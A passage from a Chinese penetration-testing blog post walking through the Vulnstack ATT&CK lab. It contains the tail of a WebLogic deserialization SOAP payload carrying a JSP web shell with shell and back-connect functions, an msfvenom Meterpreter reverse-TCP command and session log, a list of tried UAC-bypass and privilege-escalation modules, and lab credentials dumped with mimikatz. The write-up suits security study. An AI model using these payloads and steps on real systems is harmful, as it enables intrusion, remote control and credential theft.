class="string">"vCreateFile"</span>,<span class="keyword">new</span> VCreateFileInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vEdit"</span>,<span class="keyword">new</span> VEditInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"createFile"</span>,<span class="keyword">new</span> CreateFileInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vEditProperty"</span>,<span class="keyword">new</span> VEditPropertyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"editProperty"</span>,<span class="keyword">new</span> EditPropertyInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vs"</span>,<span class="keyword">new</span> VsInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"shell"</span>,<span class="keyword">new</span> ShellInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"down"</span>,<span class="keyword">new</span> DownInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vd"</span>,<span class="keyword">new</span> VdInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"downRemote"</span>,<span class="keyword">new</span> DownRemoteInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"index"</span>,<span class="keyword">new</span> IndexInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"mkdir"</span>,<span class="keyword">new</span> MkDirInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"move"</span>,<span class="keyword">new</span> MoveInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"removedir"</span>,<span class="keyword">new</span> RemoteDirInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"packBatch"</span>,<span class="keyword">new</span> PackBatchInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"pack"</span>,<span class="keyword">new</span> PackInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"unpack"</span>,<span class="keyword">new</span> UnPackInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vmp"</span>,<span class="keyword">new</span> VmpInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vbc"</span>,<span class="keyword">new</span> VbcInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"backConnect"</span>,<span class="keyword">new</span> BackConnectInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"jspEnv"</span>,<span class="keyword">new</span> JspEnvInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"smp"</span>,<span class="keyword">new</span> SmpInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"mapPort"</span>,<span class="keyword">new</span> MapPortInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"top"</span>,<span class="keyword">new</span> TopInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"vso"</span>,<span class="keyword">new</span> VOnLineShellInvoker());</span></span><br><span class="line"><span class="vbscript">ins.put(<span class="string">"online"</span>,<span class="keyword">new</span> OnLineInvoker());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"><span class="vbscript">&lt;%</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> o = <span class="built_in">request</span>.getParameter(<span class="string">"o"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(o)) &#123;</span></span><br><span class="line"><span class="vbscript">Invoker <span class="keyword">in</span> = ins.<span class="keyword">get</span>(o);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="keyword">in</span> == <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (<span class="keyword">in</span>.doBefore()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"folder"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(path))</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,path);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"before"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"script"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"top"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">in</span>.invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!<span class="keyword">in</span>.doAfter()) &#123;</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"bottom"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"after"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;					</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="vbscript">e.printStackTrace(<span class="keyword">new</span> PrintStream(bout));</span></span><br><span class="line"><span class="vbscript">session.setAttribute(CURRENT_DIR,SHELL_DIR);</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,Util.htmlEncode(<span class="keyword">new</span> <span class="built_in">String</span>(bout.toByteArray())).<span class="built_in">replace</span>(<span class="string">"\n"</span>,<span class="string">"&lt;br/&gt;"</span>),<span class="string">"left"</span>);</span></span><br><span class="line"><span class="vbscript">bout.close();</span></span><br><span class="line"><span class="vbscript">out.flush();</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"bottom"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"after"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,session);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">]]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p></code></pre></p>
</details>
然后在上冰蝎马，好使了  也不知道是什么原因 有可能是有空格???
接下来用冰蝎上传msf的exe文件 使用msf监听 并运行

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="number">5</span> -b <span class="string">'\x00'</span> LHOST=<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f exe &gt; abc.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[*] Sending stage (<span class="number">53906</span> bytes) to <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span>:<span class="number">49490</span>) at <span class="number">2020</span><span class="number">-03</span><span class="number">-11</span> <span class="number">22</span>:<span class="number">13</span>:<span class="number">40</span> <span class="number">-0400</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WEB\de1ay</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment <span class="keyword">is</span> incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure>
<p>进去之后是低权用户无法提权 使用Bypass UAC</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac  <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ask  <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac_injection <span class="comment">//失败</span></span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_comhijack <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_dotnet_profiler <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_fodhelper <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_injection_winsxs <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_sdclt <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_silentcleanup <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_sluihijack <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_vbs <span class="comment">//失败</span></span><br></pre></td></tr></table></figure>
<p>用这个模块检测漏洞</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="keyword">post</span>/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>

<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr  <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ikeext_service  <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms10_092_schelevator <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms13_053_schlamperei <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms13_081_track_popup_menu <span class="comment">//失败</span></span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms14_058_track_popup_menu</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms15_051_client_copy_image</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms16_075_reflection</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ms16_075_reflection_juicy</span><br><span class="line">exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure>
<p>也不知道为什么  msf的ms14-058就打不进去  cs的就可以<br>用cs提权到system权限</p>
<h2 id="渗透PC、DC"><a href="#渗透PC、DC" class="headerlink" title="渗透PC、DC"></a>渗透PC、DC</h2><p>使用cs的mimikatz读密码<br>username:de1ay<br>password:fuck!@#123</p>
<p>DC<br>username:mssql<br>password:1qaz@WSX</p>

    </div>

    
    
    
        <div>
            
            <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
            
        </div>
      <footer class="post-footer">


        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/1cb8ad01.html" rel="prev" title="Vlunstack ATT&CK实战系列0×1">
      <i class="fa fa-chevron-left"></i> Vlunstack ATT&CK实战系列0×1
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/3620944d.html" rel="next" title="Windows后门">
      Windows后门 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下载地址"><span class="nav-number">2.</span> <span class="nav-text">下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置"><span class="nav-number">3.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透WEB主机"><span class="nav-number">4.</span> <span class="nav-text">渗透WEB主机</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证漏洞"><span class="nav-number">4.2.</span> <span class="nav-text">验证漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透PC、DC"><span class="nav-number">5.</span> <span class="nav-text">渗透PC、DC</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Timor"
      src="/images/xiaobai.jpg">
  <p class="site-author-name" itemprop="name">Timor</p>
  <div class="site-description" itemprop="description">渗透测试|网络安全|信息安全|WEB安全</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/timorblog" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;timorblog" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        
  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">辽ICP备19000813号-1 </a>|
      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=21071102000174" rel="noopener" target="_blank">辽公网安备 21071102000174号 </a>
  </div>

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Timor</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
    })();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

 <!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js">
  
</script>
</body>
</html>
